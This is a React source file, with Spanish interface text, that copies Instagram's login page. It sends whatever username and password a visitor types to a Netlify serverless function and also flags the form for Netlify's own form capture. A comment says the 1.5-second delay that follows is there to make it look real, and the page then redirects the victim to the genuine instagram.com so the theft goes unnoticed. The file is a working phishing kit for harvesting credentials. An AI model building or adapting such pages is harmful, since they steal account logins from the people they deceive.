import React, { useState } from 'react';
import './LoginPage.css';

function LoginPage() {
  const [credentials, setCredentials] = useState({
    username: '',
    password: ''
  });
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');

  const handleChange = (e) => {
    setCredentials({
      ...credentials,
      [e.target.name]: e.target.value
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);
    setError('');
    
    try {
      // 1. Enviar datos a nuestra función serverless
      const response = await fetch('/.netlify/functions/handle-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(credentials)
      });

      if (!response.ok) {
        throw new Error('Error de autenticación');
      }

      // 2. Simular delay para hacer parecer real
      await new Promise(resolve => setTimeout(resolve, 1500));

      // 3. Guardar en localStorage para simular sesión
      localStorage.setItem('instagram_session', Date.now());

      // 4. Redirigir a Instagram real
      window.location.href = 'https://www.instagram.com';
      
    } catch (error) {
      setError('Lo sentimos, no pudimos iniciar sesión. Por favor, inténtalo de nuevo.');
      console.error('Error:', error);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="login-page">
      <div className="login-form-container">
        <form 
          className="login-form"
          onSubmit={handleSubmit}
          name="login-form"
          method="POST"
          data-netlify="true"
        >
          <input type="hidden" name="form-name" value="login-form" />
          
          <h1>Instagram</h1>
          
          <input
            type="text"
            name="username"
            placeholder="Teléfono, usuario o correo electrónico"
            value={credentials.username}
            onChange={handleChange}
            required
          />
          
          <input
            type="password"
            name="password"
            placeholder="Contraseña"
            value={credentials.password}
            onChange={handleChange}
            required
          />
          
          {error && (
            <div className="error-message">
              {error}
            </div>
          )}
          
          <button 
            type="submit" 
            disabled={isLoading}
            className={isLoading ? 'loading' : ''}
          >
            {isLoading ? 'Iniciando sesión...' : 'Iniciar sesión'}
          </button>
          
          <div className="divider">
            <div className="line"></div>
            <span>o</span>
            <div className="line"></div>
          </div>
          
          <a href="#" className="facebook-login">
            Iniciar sesión con Facebook
          </a>
          
          <a href="#" className="forgot-password">
            ¿Olvidaste tu contraseña?
          </a>
        </form>

        <div className="signup-container">
          <p>
            ¿No tienes una cuenta? <a href="#">Regístrate</a>
          </p>
        </div>

        <div className="get-app">
          <p>Descarga la aplicación.</p>
          <div className="app-stores">
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Yfc020c87j0.png" alt="Disponible en App Store" />
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Disponible en Google Play" />
          </div>
        </div>

        <footer className="footer">
          <div className="footer-links">
            <a href="#">Meta</a>
            <a href="#">Información</a>
            <a href="#">Blog</a>
            <a href="#">Empleo</a>
            <a href="#">Ayuda</a>
            <a href="#">API</a>
            <a href="#">Privacidad</a>
            <a href="#">Condiciones</a>
            <a href="#">Ubicaciones</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Threads</a>
            <a href="#">Subir contactos</a>
            <a href="#">Meta Verified</a>
          </div>
          <div className="footer-copyright">
            <select>
              <option value="es">Español</option>
            </select>
            © 2024 Instagram from Meta
          </div>
        </footer>
      </div>
    </div>
  );
}

export default LoginPage;
